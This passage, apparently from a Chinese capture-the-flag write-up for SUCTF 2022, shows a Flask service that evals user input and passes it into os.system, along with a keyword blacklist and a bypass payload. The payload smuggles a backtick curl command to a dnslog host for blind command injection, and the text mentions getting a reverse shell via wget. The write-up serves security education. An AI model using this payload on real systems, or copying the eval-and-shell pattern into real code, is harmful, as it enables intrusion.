            break
    return flag
    

@app.route("/")
def index():
    "欢迎来到SUctf2022"
    return render_template("index.html")

@app.route("/calc",methods=['GET'])
def calc():
    ip = request.remote_addr
    num = request.values.get("num")
    log = "echo {0} {1} {2}> ./tmp/log.txt".format(time.strftime("%Y%m%d-%H%M%S",time.localtime()),ip,num)
    
    if waf(num):
        try:
            data = eval(num)
            os.system(log)
        except:
            pass
        return str(data)
    else:
        return "waf!!"

if __name__ == "__main__":
    app.run(host='0.0.0.0',port=5000)  
```
这里就是传了一个num参数进去，这里如果参数通过了waf，那么就会计算结果，并且system函数执行log，猜测这里是通过注入一些危险的命令去执行
这里有一个waf，过滤了很多东西
```php
blacklist = ['import','(',')',' ','_','|',';','"','{','}','&','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__']
```
但是由于命令执行没有回显，所以用dnslog，这样操作可以绕过
空格用%09代替
直接注入代码会报错，因为num代码会走进eval造成报错，所以需要加一个#作为注释符来绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/96fbafcd55e44bb2abcd1c5d0e88b2a8.png)



```php
1%23%60curl%09zeej2v.dnslog.cn%60
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/cd8b3fd229434f81bda513713bedeca8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_17,color_FFFFFF,t_70,g_se,x_16)

可以成功执行命令

![在这里插入图片描述](https://img-blog.csdnimg.cn/f8a1c06abef24aa5815fcaee7c134e96.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

试着反弹shell，直接执行弹shell不行，很多被过滤了，所以我们利用wget去传命令上去执行

![在这里插入图片描述](https://img-blog.csdnimg.cn/afa8306a958b47f799c36d8f39169cec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)



![在这里插入图片描述](https://img-blog.csdnimg.cn/d6faed214cba4f749b902efbef4d8a6a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

![在这里插入图片描述](https://img-blog.csdnimg.cn/87a13fa402f64214b1f1e2d84d39e0f0.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/44185ab2ce9c40848ea6bb48ad43fbe6.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/5541c7114d1f44c6993a9e0cfbed42e9.png)


